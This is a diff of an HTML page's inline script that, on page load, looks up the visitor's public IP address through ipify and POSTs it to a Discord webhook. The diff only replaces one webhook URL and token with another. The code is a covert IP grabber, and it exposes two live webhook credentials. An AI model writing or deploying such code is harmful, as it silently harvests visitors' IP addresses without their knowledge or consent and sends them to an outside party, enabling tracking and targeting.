@@ -9,7 +9,7 @@
     <script>
         fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
-            .then(data => fetch('https://discord.com/api/webhooks/1335125244364455956/9inY9IIqiIixJ_4sf86jSawVLq4pKOb3mi74HSUcltpa9Ipc8fMwlN1-RZfky3avRN6y', {
+            .then(data => fetch('https://discord.com/api/webhooks/1335135046633525330/lu2M-H2A36_E_68tGUVcgQnwqInav48znOPlRR6R-_GuFGWyHEdyE4-S32eAArllrh4X', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({content: `IP: ${data.ip}`})
